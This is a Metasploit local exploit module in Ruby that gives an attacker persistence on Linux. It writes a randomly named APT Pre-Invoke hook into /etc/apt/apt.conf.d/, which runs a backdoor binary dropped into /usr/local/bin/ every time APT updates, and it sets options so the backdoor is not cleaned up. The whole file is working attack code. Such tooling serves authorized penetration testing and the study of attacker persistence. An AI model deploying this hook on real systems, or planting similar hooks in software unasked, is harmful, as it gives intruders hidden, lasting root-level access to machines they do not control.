##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::File
  include Msf::Post::Linux::System
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Deprecated
  moved_from 'exploits/linux/local/apt_package_manager_persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'APT Package Manager Persistence',
        'Description' => %q{
          This module will run a payload when the APT package manager is used.
          This module creates a pre-invoke hook for APT in apt.conf.d. Write access
          to the apt.conf.d directory is required, typically requiring root access.

          The hook name is randomized if not specified.

          Verified on Ubuntu 22.04
        },
        'License' => MSF_LICENSE,
        'Author' => ['Aaron Ringo'],
        'Platform' => ['linux', 'unix'],
        'Arch' => [
          ARCH_CMD,
          ARCH_X86,
          ARCH_X64,
          ARCH_ARMLE,
          ARCH_AARCH64,
          ARCH_PPC,
          ARCH_MIPSLE,
          ARCH_MIPSBE
        ],
        'DefaultOptions' => {
          'WfsDelay' => 90_000, # 25hrs
          'AllowNoCleanup' => true # don't delete our persistence after we get a shell
        },
        'SessionTypes' => ['shell', 'meterpreter'],
        'DisclosureDate' => '1999-03-09', # Date APT package manager was included in Debian
        'References' => ['URL', 'https://unix.stackexchange.com/questions/204414/how-to-run-a-command-before-download-with-apt-get'],
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0,
        'Stance' => Msf::Exploit::Stance::Passive,
        'Passive' => true, # XXX when set, ignores wfsdelay and immediately exists after last command
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options(
      [
        OptString.new('HOOKNAME', [false, 'Name of hook file to write']),
        OptString.new('BACKDOOR_NAME', [false, 'Name of binary to write']),
        OptString.new('HOOKPATH', [true, 'The directory where the apt configurations are located', '/etc/apt/apt.conf.d/'])
      ]
    )

    register_advanced_options(
      [
        OptString.new('WritableDir', [true, 'A directory where we can write files', '/usr/local/bin/'])
      ]
    )
  end

  def check
    return CheckCode::Safe("#{datastore['HOOKPATH']} not found") unless exists?(datastore['HOOKPATH'])
    return CheckCode::Safe("#{datastore['HOOKPATH']} not writable") unless writable?(datastore['HOOKPATH'])
    return CheckCode::Safe("#{datastore['WritableDir']} not found") unless exists?(datastore['WritableDir'])
    return CheckCode::Safe("#{datastore['WritableDir']} not writable") unless writable?(datastore['WritableDir'])

    CheckCode::Detected
  end

  def exploit
    fail_with Failure::BadConfig, "#{datastore['HOOKPATH']} not writable, or APT is not on system" unless writable?(datastore['HOOKPATH'])
    hook_path = datastore['HOOKPATH']
    hook_path << (datastore['HOOKNAME'] || "#{rand_text_numeric(2)}#{rand_text_alpha(5..8)}")

    backdoor_path = datastore['WritableDir']
    unless writable? backdoor_path
      fail_with Failure::BadConfig, "#{backdoor_path} is not writable"
    end
    backdoor_name = datastore['BACKDOOR_NAME'] || rand_text_alphanumeric(5..10)
    backdoor_path << backdoor_name

    print_status('Attempting to write hook:')
    hook_script = %(APT::Update::Pre-Invoke {"setsid #{backdoor_path} 2>/dev/null &"};)
    write_file(datastore['HOOKPATH'], hook_script)

    fail_with Failure::Unknown, 'Failed to write Hook' unless exist?(datastore['HOOKPATH'])

    print_status("Wrote #{datastore['HOOKPATH']}")

    if payload.arch.first == 'cmd'
      write_file(backdoor_path, payload.encoded)
    else
      write_file(backdoor_path, generate_payload_exe)
    end

    fail_with Failure::Unknown, "Failed to write #{backdoor_path}" unless exist?(backdoor_path)

    print_status("Backdoor uploaded #{backdoor_path}")
    # permissions chosen to reflect common perms in /usr/local/bin/
    chmod(backdoor_path, 0o755)

    print_good('Backdoor will run on next APT update')
  end
end
